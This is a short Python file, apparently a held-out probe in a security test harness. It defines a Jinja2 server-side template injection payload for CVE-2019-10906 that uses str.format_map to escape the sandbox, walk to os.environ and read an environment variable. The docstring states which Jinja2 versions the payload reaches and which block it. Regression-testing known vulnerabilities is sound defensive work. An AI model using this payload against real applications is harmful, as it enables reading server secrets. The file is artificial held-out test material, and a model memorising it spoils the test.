#!/usr/bin/env python3
"""[HELD-OUT] CVE-2019-10906 residual for jinja2-cve-2019-10906.

The sibling of the CVE-2016-10745 seed: identical field walk, but spelled with
`str.format_map` instead of `str.format`. The 2.8.1 fix intercepted only `.format`
(inspect_format_method: `callable.__name__ != 'format'`), so `.format_map` runs
NATIVELY on V1 -- the same sandbox escape the 2016 patch claimed to close.

  V0 (2.7.3):  native format_map -> reaches flag.
  V1 (2.8.1):  `.format_map` NOT intercepted -> native format_map -> reaches flag.  <- residual open
  V2 (2.10.1): guard widened to include 'format_map' -> SandboxedFormatter -> SecurityError -> BLOCKED.

The ONLY difference from the seed is `.format` -> `.format_map` (a mapping arg), which is
exactly the sibling-method gap the incomplete 2016 fix left behind.
"""

PAYLOAD = (
    '{{ "{cfg.__init__.__globals__[os].environ[PCB_CANARY]}".format_map({\'cfg\': cfg}) }}'
)


def candidate() -> dict:
    return {"probe_id": "cve-2019-10906-str-format_map", "code": PAYLOAD}


if __name__ == "__main__":
    print(candidate()["code"])
